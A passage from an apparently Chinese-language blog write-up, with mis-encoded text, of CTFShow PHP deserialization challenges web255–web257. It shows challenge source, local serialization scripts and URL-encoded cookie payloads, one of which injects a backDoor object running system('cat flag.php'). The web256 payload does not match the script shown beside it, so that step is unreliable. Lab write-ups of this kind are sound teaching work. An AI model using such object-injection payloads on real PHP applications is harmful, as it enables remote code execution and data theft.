class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>å…ˆçœ‹å®šä¹‰çš„ class ctfShowUser. </li>
<li>ä¸‰ä¸ª public çš„å˜é‡ï¼šusername=â€™xxxxxxâ€™, password=â€™xxxxxxâ€™, isVip=false; isVipï¼šfalseç›¸å¯¹çš„å°±æ˜¯ ture;</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿™ä¸ª checkVip() ç®€å•æ˜äº†ï¼Œç›´æ¥è¿”å›å˜é‡ isVipçš„å€¼ï¼šfalseæˆ–è€…<strong>true</strong>;</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>login()å‡½æ•°çš„è¿”å›å€¼æ˜¯ç±»ä¸­çš„å˜é‡usernameå’Œpasswordï¼Œå¯¹å½¢å‚ u å’Œ pçš„åˆ¤æ–­çš„è¿”å›å€¼ : trueæˆ–è€…false;é‚£ä¹ˆ<strong>å½¢å‚å¿…é¡»å’Œä¸¤ä¸ªå˜é‡çš„å€¼ç›¸ç­‰æ‰èƒ½ä¸º: true</strong>;</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>vipOneKeyGetFlag()å‡½æ•°é¦–å…ˆifåˆ¤æ–­å˜é‡ isVipæ˜¯å¦ä¸º trueï¼Œä¸ºtrueåˆ™è¾“å‡ºflag.å¦åˆ™å°†è¾“å‡ºï¼šä¸æ˜¯vipæ²¡æœ‰flagï¼›é‚£ä¹ˆéœ€è¦è®© <strong>isVip=true</strong>;</li>
<li>æœ€åæ¥çœ‹åé¢çš„ è°ƒç”¨:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123; <span class="comment">// åˆ¤æ–­æ˜¯å¦æœ‰ username,passwordä¸¤ä¸ªå€¼ã€‚</span></span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]); <span class="comment">// é‡ç‚¹ï¼šunserialize($_COOKIE[&#x27;user&#x27;]),å°†cookieä¸­userå€¼ååºåˆ—åŒ–åèµ‹å€¼ç»™å˜é‡user. å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶user=æ­£ç¡®çš„åºåˆ—åŒ–çš„è¯­å¥ã€‚</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123; <span class="comment">//è°ƒç”¨ç±»ä¸­çš„loginå‡½æ•°æ¥æ£€æµ‹username,passwordæ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´æ‰ä¸º true,æ‰èƒ½æ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚æ­¤å¤„ä¸¤ä¸ªå˜é‡ä¸ºå‡½æ•°å¾—å®å‚ã€‚</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;  <span class="comment">// è°ƒç”¨ checkVip()åœ¨å‰é¢å·²ç»çŸ¥é“äº†å®ƒç›´æ¥è¿”å›å˜é‡ isVipçš„å€¼ï¼štrueæˆ–è€…false.å¿…é¡»å¾—ä¸º trueæ‰è¡Œã€‚</span></span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag(); <span class="comment">// vipOneKeyGetFlag()å‡½æ•°æ˜¯å¦ä¸º vip ï¼Œç„¶åæ ¹æ®åˆ¤æ–­æ˜¯å¦è¾“å‡ºflag.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>çœ‹æ³¨é‡Šï¼</p>
</li>
<li><p>æ ¹æ®åˆ†ææœ¬åœ°è¯•éªŒ:</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">// username,passwordä¸å˜;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;        <span class="comment">// æ›´æ”¹ä¸º true;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$str</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>.<span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = urlencode(<span class="variable">$str</span>); <span class="comment">//éœ€è¦urlç¼–ç </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>äº§ç”Ÿç»“æœ:</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web255.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨ Burp å¯¹ cookie ç¼–è¾‘,é¦–å…ˆè¦å°† url ä¼ å…¥ usernameå’Œpassword</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web255_1.png"></p>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web255_2.png"></p>
<ul>
<li>è®¾ç½®å®Œæ¯•.sendä¸€ä¸‹çœ‹çœ‹ç»“æœ</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web255_3.png"></p>
<ul>
<li>ok å¾—åˆ°äº†flag.</li>
</ul>
<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>ç›¸è¾ƒäºweb255ç±»ä¼¼ã€‚</li>
<li>ä¸åŒä¹‹å¤„åœ¨: ctfShowUserç±»ä¸­ : å¢åŠ äº† ifåˆ¤æ–­</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123; <span class="comment">// ifåˆ¤æ–­è¦usernameå’Œpasswordä¸ç›¸ç­‰</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>é‚£æ—¢ç„¶åªæ›´æ”¹äº†è¿™ä¸€ç‚¹ã€‚è®©usernameå’Œpasswordä¸ç›¸ç­‰ã€‚</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?username=x&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>

<ul>
<li>æœ¬åœ°åºåˆ—åŒ–:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$str</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = urlencode(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web256.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>cat+flag.php%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<ul>
<li>Burp:</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web256_1.png"></p>
<ul>
<li>å¾—åˆ°äº† flag!</li>
</ul>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è¿™é“é¢˜ï¼Œå¤šäº†ä¸¤ä¸ª class: info å’Œ backDoor</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">// å®šä¹‰ç§æœ‰çš„å˜é‡ user</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user; <span class="comment">// getInofå‡½æ•° ç›´æ¥è¿”å› userå€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>; <span class="comment">// å˜é‡ code. </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code); <span class="comment">// eval() æ‰§è¡Œ å˜é‡ code ï¼Œé‚£ä¹ˆç»å¯¹éœ€è¦è¿™ä¸ª ç±»ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å†æ¥çœ‹çœ‹ ctfShowUserç±»ï¼š</li>
<li>å¤šäº†ä¸€ä¸ªå˜é‡ class = â€˜infoâ€™  ï¼Œæ—¢ç„¶æœ‰ info é‚£æ˜¯ä¸æ˜¯ä¼šæœ‰ class=â€™backDoorâ€™ å‘¢ï¼Ÿè€ŒbackDoorä¸­æ­£å¥½æœ‰ eval()å‡½æ•°ã€‚</li>
<li>å¤šäº†é­”æœ¯å˜é‡: <strong>__construct()</strong>  **__ destruct()**ï¼Œä¸€ä¸ªè¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¸€ä¸ªè¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚é­”æœ¯å˜é‡åœ¨åºåˆ—åŒ–ä¸­å¿…ä¸å¯å°‘ï¼</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()	<span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨__destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">__toString()	<span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span></span><br><span class="line">__sleep() 		<span class="comment">//åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span></span><br><span class="line">__wakeup()		<span class="comment">//å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</span></span><br><span class="line">__destruct()     <span class="comment">//ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</span></span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info(); <span class="comment">// è¿™é‡Œçš„ class newäº†ä¸€ä¸ªå¯¹è±¡:nwe info()ï¼Œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();<span class="comment">// è¿™é‡ŒæŒ‡å‘ class ä¸­çš„å‡½æ•°getInfo(), class info()å’Œclass backDoor()ä¸­éƒ½æœ‰getInfo()å‡½æ•°ã€‚</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å†æ¥çœ‹çœ‹åé¢çš„è°ƒç”¨: </li>
</ul>
